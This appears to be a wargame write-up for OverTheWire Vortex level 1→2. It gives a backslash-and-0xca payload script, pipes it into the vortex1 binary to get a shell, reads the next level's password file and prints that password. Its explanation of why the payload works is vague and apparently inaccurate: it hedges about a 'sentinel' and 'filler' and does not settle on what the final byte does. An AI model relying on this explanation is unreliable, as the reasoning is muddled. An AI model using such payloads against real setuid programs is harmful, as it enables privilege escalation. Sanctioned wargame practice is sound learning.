# Vortex Level 1 → 2

## Goal

`vortex1` reads your input and copies it into a stack buffer that also holds a **sentinel byte `\xca`**. The program checks that sentinel before using the data — so any overflow that clobbers it gets rejected. The trick: overflow *around* the sentinel, padding with characters that also double as filler the input filter tolerates (backslashes in this case).

## Concepts you'll learn

- Canary / sentinel checks and how they differ from stack canaries
- Crafting a payload that deliberately preserves one byte of the buffer
- Using backslashes as payload filler when they pass the input filter but don't break anything downstream

## Walkthrough

### 1. Read the binary

Under `gdb`, identify:

- The buffer size and the position of the `\xca` sentinel
- The offset from buffer start to the saved return address

avishai's solve reports the layout requires **261 bytes of filler** (specifically `\`), then the `\xca` byte preserved at its original position, then one more byte (`A`) that pushes execution to a useful location.

### 2. Build the payload

```python
# level1.py
from pwn import *
sys.stdout.buffer.write(b"\\" * 261 + b"\xca" + b"A")
```

The repeated `\` fills the buffer while:

- Not tripping the input filter (if there's one looking for nulls or suspicious bytes)
- Not containing `\x00` or `\xca` itself (so we don't corrupt the sentinel we're supposed to preserve)

The trailing `A` is the piece that actually redirects execution — or, in this particular level, is a single byte that slides the program into a reachable branch.

### 3. Fire with stdin kept open

```bash
$ (python3 level1.py; cat) | /vortex/vortex1
$ whoami
vortex2
$ cat /etc/vortex_pass/vortex2
WyEmn5wiX
```

The trailing `cat` keeps stdin attached after the exploit payload flushes so the resulting shell doesn't immediately read EOF and quit.

## The answer

The password for `vortex2` is:

**`WyEmn5wiX`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/vortex/vortex1.html>
